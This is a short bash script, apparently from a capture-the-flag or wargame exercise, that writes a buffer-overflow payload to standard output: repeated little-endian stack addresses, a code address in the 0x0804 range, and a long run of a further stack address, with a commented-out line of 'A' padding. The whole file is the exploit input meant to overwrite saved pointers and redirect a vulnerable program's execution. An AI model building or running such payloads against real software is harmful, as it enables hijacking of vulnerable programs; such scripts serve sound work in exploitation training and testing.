#!/bin/bash

python -c 'import sys; sys.stdout.write("\x96\xf3\xff\xbf" * 19)'
echo -ne '\x60\x33\xff\xbf'
echo -ne '\x3e\x85\x04\x08'
python -c 'import sys; sys.stdout.write("\x60\x33\xff\xbf" * 100)'
echo '' 

#echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA'
